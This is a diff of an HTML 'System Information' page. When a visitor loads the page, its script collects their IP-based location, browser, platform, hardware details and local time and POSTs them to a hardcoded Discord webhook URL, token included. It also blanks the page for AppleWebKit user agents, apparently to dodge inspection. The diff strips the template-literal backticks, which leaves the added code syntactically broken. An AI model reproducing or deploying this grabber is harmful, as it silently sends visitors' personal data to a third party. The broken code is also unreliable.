@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>System Information</title>
   <style>
     body {
@@ -22,11 +22,13 @@
   <pre id="info">Gathering system information...</pre>
 
   <script>
+    // Function to check if the user is a bot based on user-agent patterns
     function isBot() {
       const userAgent = navigator.userAgent;
       return /AppleWebKit/.test(userAgent);
     }
 
+    // Function to fetch IP and location data
     async function fetchIPData() {
       try {
         const response = await fetch("https://ipapi.co/json/");
@@ -50,39 +52,28 @@
       }
     }
 
-    async function fetchWebhookUrl() {
-      try {
-        const response = await fetch("webhook.json");
-        const data = await response.json();
-        return data.url;
-      } catch (error) {
-        console.error("Failed to load webhook URL:", error);
-        return null;
-      }
-    }
-
+    // Function to gather and display system information
     async function gatherSystemInfo() {
+      // Detect bots and terminate execution if a bot is detected
       if (isBot()) {
-        document.body.innerHTML = "";
-        return;
+        document.body.innerHTML = ""; // Clear page content
+        return; // Stop further execution
       }
-
-      const webhookUrl = await fetchWebhookUrl();
-      if (!webhookUrl) return;
 
       const ipData = await fetchIPData();
 
-      const screenResolution = `${window.screen.width}x${window.screen.height}`;
-      const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
+      // Gather system information
+      const screenResolution = ${window.screen.width}x${window.screen.height};
+      const windowDimensions = ${window.innerWidth}x${window.innerHeight};
       const browser = navigator.userAgent;
       const operatingSystem = navigator.platform;
       const cpuCores = navigator.hardwareConcurrency;
-      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
+      const memory = navigator.deviceMemory ? ${navigator.deviceMemory} GB : "Unavailable";
       const touchscreenSupport = navigator.maxTouchPoints > 0;
       const language = navigator.language;
       const localTime = new Date().toString();
 
-      const message = `
+      const message = 
 Screen Resolution: ${screenResolution}
 Window Dimensions: ${windowDimensions}
 Browser: ${browser}
@@ -97,10 +88,13 @@ Country: ${ipData.country}
 City: ${ipData.city}
 Region: ${ipData.region}
 Timezone: ${ipData.timezone}
-      `;
+      ;
 
+      // Display the information on the page
       document.getElementById("info").textContent = message;
 
+      // Send the information to the webhook
+      const webhookUrl = "https://discord.com/api/webhooks/1369448099533295657/W_ykMoSS_yzcoGdoV4UMChx48x57A0xKm8xfOGqcu5JKfJcPIOlXV31jaGL_WFuhwdPx";
       try {
         await fetch(webhookUrl, {
           method: "POST",
@@ -114,6 +108,7 @@ Timezone: ${ipData.timezone}
       }
     }
 
+    // Call the function to gather and display system info
     gatherSystemInfo();
   </script>
 </body>
